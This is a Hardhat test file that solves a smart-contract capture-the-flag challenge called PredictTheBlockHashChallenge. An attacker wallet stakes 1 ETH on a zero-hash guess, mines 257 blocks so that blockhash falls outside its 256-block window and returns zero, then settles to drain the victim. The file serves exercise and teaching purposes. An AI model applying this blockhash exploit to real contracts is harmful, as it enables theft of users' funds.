const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { mine } = require("@nomicfoundation/hardhat-network-helpers");

const NAME = "PredictTheBlockHashChallenge";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({value: ethers.utils.parseEther("1")});

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            //Exploit - is to use block.blockhash scalability restriction of 256

            //Lets pass zero hash as guess
            let tx = await victimContract.connect(attackerWallet).lockInGuess(ethers.constants.HashZero,
                                                                    {value: ethers.utils.parseEther("1")});
            //console.log(tx.blockNumber);
            //let receipt = await tx.wait();

            // block.blockhash - hash of the given block when blocknumber
            // is one of the 256 most recent blocks; otherwise returns zero.
            await mine(257);
            //await time.increase(2 * 60 * 60);

            tx = await victimContract.connect(attackerWallet).settle();
            //console.log(tx.blockNumber);
        });

        after(async function () {
            expect(await victimContract.isComplete()).to.be.equal(true);
        });
    });
});